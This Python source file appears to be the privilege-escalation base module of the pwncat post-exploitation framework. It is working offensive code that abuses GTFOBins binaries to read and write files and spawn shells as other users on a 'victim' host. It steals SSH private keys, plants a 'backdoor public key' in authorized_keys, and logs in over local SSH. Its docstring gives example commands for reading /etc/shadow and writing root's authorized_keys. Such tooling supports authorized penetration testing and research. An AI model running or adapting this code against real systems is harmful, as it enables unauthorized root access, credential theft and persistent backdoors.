#!/usr/bin/env python3
from typing import List, Dict, Tuple
from io import BytesIO
import dataclasses
import time
import os

import pwncat
from pwncat.modules import (
    BaseModule,
    Argument,
    Status,
    Bool,
    Result,
    ArgumentFormatError,
    ModuleFailed,
)
from pwncat.gtfobins import Capability
from pwncat.file import RemoteBinaryPipe


class EscalateError(ModuleFailed):
    """ Indicates an error while attempting some escalation action """


def fix_euid_mismatch(exit_cmd: str, target_uid: int, target_gid: int):
    """ Attempt to gain EUID=UID=target_uid.

    This is intended to fix EUID/UID mismatches after a escalation.
    """

    pythons = [
        "python",
        "python3",
        "python3.6",
        "python3.8",
        "python3.9",
        "python2.7",
        "python2.6",
    ]
    for python in pythons:
        python_path = pwncat.victim.which(python)
        if python_path is not None:
            break

    if python_path is not None:
        command = f"exec {python_path} -c '"
        command += f"""import os; os.setreuid({target_uid}, {target_uid}); os.setregid({target_gid}, {target_gid}); os.system("{pwncat.victim.shell}")"""
        command += "'\n"
        pwncat.victim.process(command)

        new_id = pwncat.victim.id
        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
            return

    pwncat.victim.client.send(exit_cmd.encode("utf-8"))
    pwncat.victim.flush_output()

    raise EscalateError("failed to resolve euid/uid mismatch")


def euid_fix(technique_class):
    """
    Decorator for Technique classes which may end up with a RUID/EUID
    mismatch. This will check the resulting UID before/after to see
    if the change was affective and attempt to fix it.
    """

    class Wrapper(technique_class):
        def exec(self, binary: str):

            # Run the real exec
            result = super(Wrapper, self).exec(binary)

            # Check id again
            ending_id = pwncat.victim.id

            # If needed fix the UID
            if ending_id["euid"]["id"] != ending_id["uid"]["id"]:
                fix_euid_mismatch(
                    result, ending_id["euid"]["id"], ending_id["egid"]["id"]
                )

            return result

    return Wrapper


@dataclasses.dataclass
class Technique:
    """ Describes a technique possible through some module.

    Modules should subclass this class in order to implement
    their techniques. Only the methods corresponding to the
    returned `caps` need be implemented.
    """

    caps: Capability
    """ What capabilities this technique provides """
    user: str
    """ The user this provides access as """
    module: "EscalateModule"
    """ The module which provides these capabilities """

    def write(self, filepath: str, data: bytes):
        raise NotImplementedError

    def read(self, filepath: str):
        raise NotImplementedError

    def exec(self, binary: str):
        raise NotImplementedError

    def __str__(self):

        cap_names = {
            Capability.READ: "file read",
            Capability.WRITE: "file write",
            Capability.SHELL: "shell",
        }

        return (
            f"[magenta]{cap_names[self.caps]}[/magenta] as [green]{self.user}[/green] "
            f"via {self.module.human_name(self)}"
        )


class GTFOTechnique(Technique):
    """ A technique which is based on a GTFO binary """

    def __init__(
        self,
        user: str,
        module: "EscalateModule",
        method: pwncat.gtfobins.MethodWrapper,
        **kwargs,
    ):
        super(GTFOTechnique, self).__init__(method.cap, user, module)
        self.method = method
        self.kwargs = kwargs

    def write(self, filepath: str, data: str):

        payload, input_data, exit_cmd = self.method.build(
            lfile=filepath, length=len(data), user=self.user, **self.kwargs
        )

        mode = "w"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        try:
            printable = pwncat.util.isprintable(data)
        except UnicodeDecodeError:
            printable = False

        if self.method.stream == pwncat.gtfobins.Stream.PRINT and not printable:
            raise EscalateError(f"{self}.write: input data not printable")

        # Run the command
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Write the data and close the process
        with self.method.wrap_stream(pipe) as pipe:
            pipe.write(data.encode("utf-8"))

    def read(self, filepath: str):

        payload, input_data, exit_cmd = self.method.build(
            lfile=filepath, user=self.user, **self.kwargs
        )

        mode = "r"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        return self.method.wrap_stream(pipe)

    def exec(self, binary: str):

        payload, input_data, exit_cmd = self.method.build(
            shell=binary, user=self.user, **self.kwargs
        )

        # Run the initial command
        pwncat.victim.run(payload, wait=False)

        # Send required input
        pwncat.victim.client.send(input_data.encode("utf-8"))

        # Return the command to close out completely
        return exit_cmd


@dataclasses.dataclass
class FileContentsResult(Result):
    """ Result which contains the contents of a file """

    filepath: str
    pipe: RemoteBinaryPipe
    data: bytes = None

    @property
    def category(self):
        return None

    @property
    def title(self):
        return f"Contents of {self.filepath}"

    @property
    def description(self):
        with self.stream:
            return self.stream.read().decode("utf-8")

    @property
    def stream(self):
        if self.pipe is not None:
            with self.pipe:
                self.data = self.pipe.read()
            self.pipe = None

        return BytesIO(self.data)


@dataclasses.dataclass
class EscalateChain(Result):
    """ Chain of techniques used to escalate """

    user: str
    """ Initial user before escalation """
    chain: List[Tuple[Technique, str]]
    """ Chain of techniques used to escalate """

    @property
    def category(self):
        return None

    @property
    def title(self):
        return "Escalation Route"

    @property
    def description(self):
        result = []
        for i, (technique, _) in enumerate(self.chain):
            result.append(f"{(i+1)*' '}[yellow]\u2ba1[/yellow] {technique}")
        return "\n".join(result)

    def add(self, technique: Technique, exit_cmd: str):
        """ Add a link in the chain """
        self.chain.append((technique, exit_cmd))

    def extend(self, chain: "EscalateChain"):
        """ Extend this chain with another chain """
        self.chain.extend(chain.chain)

    def pop(self):
        """ Exit and remove the last link in the chain """
        _, exit_cmd = self.chain.pop()
        pwncat.victim.client.send(exit_cmd.encode("utf-8"))
        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()

    def unwrap(self):
        """ Exit each shell in the chain with the provided exit script """

        # Go through the chain in reverse
        for technique, exit_cmd in self.chain[::-1]:
            # Send the exit command
            pwncat.victim.client.send(exit_cmd.encode("utf-8"))

        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()


@dataclasses.dataclass
class EscalateResult(Result):
    """ The result of running an escalate module. This object contains
    all the enumerated techniques and provides an abstract way to employ
    the techniques to attempt privilege escalation.
    """

    techniques: Dict[str, List[Technique]]
    """ List of techniques available keyed by the user """

    @property
    def category(self):
        return None

    @property
    def title(self):
        return "Escalation Techniques"

    @property
    def description(self):

        result = []
        for user, techniques in self.techniques.items():
            for technique in techniques:
                result.append(f"  - {technique}")

            return "\n".join(result)

    def extend(self, result: "EscalateResult"):
        """ Extend this result with another escalation enumeration result.
        This allows you to enumerate multiple modules and utilize all their
        techniques together to perform escalation. """

        for key, value in result.techniques.items():
            if key not in self.techniques:
                self.techniques[key] = value
            else:
                self.techniques[key].extend(value)

    def add(self, technique: Technique):
        """ Add a new technique to this result object """
        if technique.user not in self.techniques:
            self.techniques[technique.user] = [technique]
        else:
            self.techniques[technique.user].append(technique)

    def write(
        self, user: str, filepath: str, data: bytes, progress, no_exec: bool = False
    ):
        """ Attempt to use all the techniques enumerated to write to a file
        as the given user """

        if user not in self.techniques:
            raise EscalateError(f"file write as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.WRITE in technique.caps:
                try:
                    return technique.write(filepath, data)
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file write as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file write as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            with pwncat.victim.open(filepath, "w", length=len(data)) as filp:
                filp.write(data)
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file write as {user} not possible")

        # Send the exit command to return to the previous user/undo what we
        # did to get here.
        pwncat.victim.client.send(exit_cmd)

    def read(self, user: str, filepath: str, progress, no_exec: bool = False):
        """ Attempt to use all the techniques enumerated to read a file
        as the given user """

        if user not in self.techniques:
            raise EscalateError(f"file read as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.READ in technique.caps:
                try:
                    return technique.read(filepath)
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file read as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file read as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            filp = pwncat.victim.open(filepath, "r",)
            # Our exit command needs to be run as well when the file is
            # closed
            filp.exit_cmd += exit_cmd
            return filp
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file read as {user} not possible")

    def exec(self, user: str, shell: str, progress):
        """ Attempt to use all the techniques enumerated to execute a
        shell as the specified user """

        original_user = pwncat.victim.current_user
        original_id = pwncat.victim.id
        target_user = pwncat.victim.users[user]
        task = progress.add_task("", module="escalating", status="...")

        if user in self.techniques:

            # Catelog techniques based on capability
            readers: List[Technique] = []
            writers: List[Technique] = []

            # Ensure all output is flushed
            pwncat.victim.flush_output()

            # Ensure we are in a safe directory
            pwncat.victim.chdir("/tmp")

            for technique in self.techniques[user]:
                if Capability.READ in technique.caps:
                    readers.append(technique)
                if Capability.WRITE in technique.caps:
                    readers.append(technique)
                if Capability.SHELL in technique.caps:
                    try:
                        progress.update(task, status=str(technique))
                        exit_cmd = technique.exec(shell)

                        # These are evil, but required due to latency... :/
                        time.sleep(0.1)

                        # Ensure we are stable
                        pwncat.victim.reset(hard=False)
                        pwncat.victim.update_user()

                        # Check that the escalation succeeded
                        new_id = pwncat.victim.id
                        if new_id["euid"]["id"] != target_user.id:
                            pwncat.victim.client.send(exit_cmd.encode("utf-8"))
                            pwncat.victim.flush_output(some=False)
                            continue

                        progress.update(task, visible=False, done=True)

                        return EscalateChain(
                            original_user.name, [(technique, exit_cmd)]
                        )
                    except EscalateError:
                        continue

            progress.update(task, status="checking for ssh server")

            sshd = None
            for fact in pwncat.modules.run(
                "enumerate.gather", progress=progress, types=["system.service"]
            ):
                if "sshd" in fact.data.name and fact.data.state == "running":
                    sshd = fact.data

            ssh_path = pwncat.victim.which("ssh")
            used_tech = None

            if sshd is not None and sshd.state == "running" and ssh_path:
                # SSH is running and we have a local SSH binary

                progress.update(task, "checking authorized keys location")

                # Get the path to the authorized keys file
                for fact in pwncat.modules.run(
                    "enumerate.gather", progress=progress, types=["sshd.authkey_path"],
                ):
                    authkey_path = fact.data
                    break
                else:
                    progress.log(
                        "[yellow]warning[/yellow]: assuming authorized key path: .ssh/authorized_keys"
                    )
                    authkey_path = ".ssh/authorized_keys"

                # Find relative authorized keys directory
                home = pwncat.victim.users[user].homedir
                if not authkey_path.startswith("/"):
                    if home == "" or home is None:
                        raise EscalateError("no user home directory")

                    authkey_path = os.path.join(home, authkey_path)

                progress.update(task, status="reading authorized keys")

                # Attempt to read the authorized keys file
                # this may raise a EscalateError, but that's fine.
                # If we don't have this, we can't do escalate anyway
                with self.read(user, authkey_path, no_exec=True) as filp:
                    authkeys = [line.strip().decode("utf-8") for line in filp]

                for pubkey_path in ["id_rsa.pub"]:
                    # Read the public key
                    pubkey_path = os.path.join(home, ".ssh", pubkey_path)
                    progress.update(task, status=f"attempting to read {pubkey_path}")
                    with self.read(user, pubkey_path, no_exec=True) as filp:
                        pubkey = filp.read().strip().decode("utf-8")

                    if pubkey not in authkeys:
                        continue

                    # The public key is an authorized key
                    privkey_path = pubkey_path.replace(".pub", "")
                    progress.update(
                        task,
                        status=f"attempting to read {pubkey_path.replace('.pub', '')}",
                    )
                    try:
                        with self.read(user, privkey_path, no_exec=True) as filp:
                            privkey = (
                                filp.read()
                                .strip()
                                .decode("utf-8")
                                .replace("\r\n", "\n")
                            )
                    except EscalateError:
                        # Unable to read private key
                        continue

                    # NOTE - this isn't technically true... it could have been any
                    # of the readers...
                    used_tech = readers[0]

                    break
                else:
                    # We couldn't read any private keys. Try to write one instead
                    with open(pwncat.victim.config["privkey"], "r") as filp:
                        privkey = filp.read()
                    with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
                        pubkey = filp.read().strip()

                    # Add our public key
                    authkeys.append(pubkey)

                    # This may cause a EscalateError, but that's fine. We have failed
                    # if we can't write anyway.
                    progress.update(task, status="adding backdoor public key")
                    self.write(
                        user, authkey_path, ("\n".join(authkeys) + "\n").encode("utf-8")
                    )

                    # NOTE - this isn't technically true... it could have been any
                    # of the writers
                    used_tech = writers[0]

                # Private keys **NEED** a new line
                privkey = privkey.strip() + "\n"

                # Write the private key
                progress.update(task, status="uploading private key")
                with pwncat.victim.tempfile("w", length=len(privkey)) as filp:
                    filp.write(privkey)
                    privkey_path = filp.name

                # Ensure we track this new file
                pwncat.victim.tamper.created_file(privkey_path)
                pwncat.victim.run(f"chmod 600 {privkey_path}")

                # First, run a test to make sure we authenticate
                command = (
                    f"{ssh_path} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
                    f"{user}@127.0.0.1"
                )
                output = pwncat.victim.run(f"{command} echo good")

                if b"good" not in output:
                    raise EscalateError("ssh private key failed")

                # The test worked! Run the real escalate command
                pwncat.victim.process(command)

                pwncat.victim.reset(hard=False)
                pwncat.victim.update_user()

                progress.update(task, visible=False, done=True)

                return EscalateChain(original_user.name, [(used_tech, "exit")])

        progress.update(task, visible=False, done=True)

        raise EscalateError(f"exec as {user} not possible")


class EscalateModule(BaseModule):
    """ The base module for all escalation modules.

    I want using the escalate modules to look something like this:

    # Look for techniques but don't perform escalation
    run escalate.auto user=root
    # Escalate to root automatically (e.g. enumerate all modules)
    run escalate.auto exec user=root shell=/bin/bash
    # Write a file as another user
    run escalate.auto write user=root path=/root/.ssh/authorized_keys content=~/.ssh/id_rsa.pub
    # Read a file as another user
    run escalate.auto read user=root path=/etc/shadow

    That is all "auto" module stuff. However, each individual module
    should have the same interface. Individual modules may require or
    accept other arguments from the standard if needed. During auto
    escalation, modules that require extra parameters which aren't
    specified will be ignored. From a code perspective, I'd like
    interaction with these modules to look like this:

    # Retrieve a list of techniques from the module
    escalate = pwncat.modules.run("escalate.sudo")
    # This escalation result object has methods for performing
    # escalation, but also conforms to the `Result` interface
    # for easily displaying the results.
    escalate.exec("root", shell="/bin/bash")

    # The auto module can easily collect results from
    # multiple modules in order to build a more comprehensive
    # escalation primitive
    escalate = EscalateResult(techniques={})
    for module in modules:
        escalate.extend(module.run(**kwargs))
    escalate.exec("root", shell="/bin/bash")

    As with persistence modules, if you need extra arguments for a
    specialized escalation module, you should define your arguments like so:

    ARGUMENTS = {
        **EscalateModule.ARGUMENTS,
        "custom_arg": Argument(str)
    }

    """

    ARGUMENTS = {
        "user": Argument(
            str, default="root", help="The user you would like to escalate to"
        ),
        "exec": Argument(
            Bool, default=False, help="Attempt escalation only using this module"
        ),
        "write": Argument(
            Bool, default=False, help="Attempt to write a file using this module"
        ),
        "read": Argument(
            Bool, default=False, help="Attempt to read a file using this module"
        ),
        "shell": Argument(str, default="current", help="The shell to use for exec"),
        "path": Argument(str, default=None, help="The file to read/write"),
        "data": Argument(str, default=None, help="The data to write to a file"),
    }
    # This causes the BaseModule to collapse a single generator result
    # into it's value as opposed to returning a list with one entry.
    # This allows us to use `yield Status()` to update the progress
    # while still returning a single value
    COLLAPSE_RESULT = True

    def run(self, user, exec, read, write, shell, path, data, **kwargs):
        """ This method is not overriden by subclasses. Subclasses should
        override the `enumerate`, `write`, `read`, and `exec` methods.

        Running a module results in an EnumerateResult object which can be
        formatted by the default `run` command or used to execute various
        privilege escalation primitives utilizing the techniques enumerated.
        """

        if (exec + read + write) > 1:
            raise ArgumentFormatError(
                "only one of exec, read, and write may be specified"
            )

        if path is None and (read or write):
            raise ArgumentFormatError("path not specified for read/write")

        if data is None and write:
            raise ArgumentFormatError("data not specified for write")

        result = EscalateResult({})

        yield Status("gathering techniques")

        for technique in self.enumerate(**kwargs):
            yield Status(technique)
            result.add(technique)

        if shell == "current":
            shell = pwncat.victim.shell

        if exec:
            yield result.exec(user=user, shell=shell, progress=self.progress)
        elif read:
            filp = result.read(user=user, filepath=path, progress=self.progress)
            yield FileContentsResult(path, filp)
        elif write:
            yield result.write(
                user=user, filepath=path, data=data, progress=self.progress
            )
        else:
            yield result

    def enumerate(self, **kwargs):
        """ Enumerate techniques for this module which can perform the
        requested some of the requested capabilities. This should be
        a generator, and yield individual techniques. Techniques are
        self-contained objects which can perform the enumerated
        capabilities. """

        while False:
            yield None

        raise NotImplementedError

    def human_name(self, tech: "Technique"):
        """ Defines the human readable name/description of this vuln """
        return self.name
